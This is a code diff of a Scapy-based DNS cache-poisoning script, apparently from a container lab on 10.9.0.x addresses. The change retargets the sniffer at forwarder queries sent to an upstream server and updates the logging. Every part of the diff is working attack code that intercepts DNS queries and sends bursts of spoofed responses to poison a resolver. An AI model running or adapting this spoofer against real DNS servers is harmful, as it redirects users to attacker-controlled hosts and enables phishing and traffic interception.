@@ -3,17 +3,17 @@ from scapy.all import *
 
 DNS_SERVER_IP = "10.9.0.53"
 ATTACKER_IP = "10.9.0.100"
+UPSTREAM_IP = "10.9.0.254"
 
 # Layer 3 raw socket binding
 sock = conf.L3socket(type=ETH_P_ALL)
 
 def poison_cache(pkt):
-    if pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[IP].src == DNS_SERVER_IP:
-        
+    if pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[IP].dst == UPSTREAM_IP:
         qname = pkt[DNS].qd.qname
         qname_str = qname.decode('utf-8')
-        print(f"[+] Intercepted forwarder query for: {qname_str}")
-        print(f"    Transaction ID: {pkt[DNS].id} | Target Port: {pkt[UDP].dport}")
+        print(f"[+] Intercepted dnsmasq forwarder query for: {qname_str}")
+        print(f"    Transaction ID: {pkt[DNS].id} | Source Port: {pkt[UDP].sport} -> Destination Port: {pkt[UDP].dport}")
 
         # Layer 3/4 Pivoting: Explicitly mirror the expected upstream destination
         ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
@@ -53,6 +53,6 @@ def poison_cache(pkt):
             sock.send(spoofed_pkt)
         print(f"[!] Injection burst sequence deployed to BIND.\n")
 
-filter_rule = f"udp and src host {DNS_SERVER_IP} and dst port 53"
+filter_rule = f"udp and src host {DNS_SERVER_IP} and dst host {UPSTREAM_IP}"
 print(f"[*] Actively monitoring container network with filter: '{filter_rule}'")
 sniff(filter=filter_rule, prn=poison_cache)
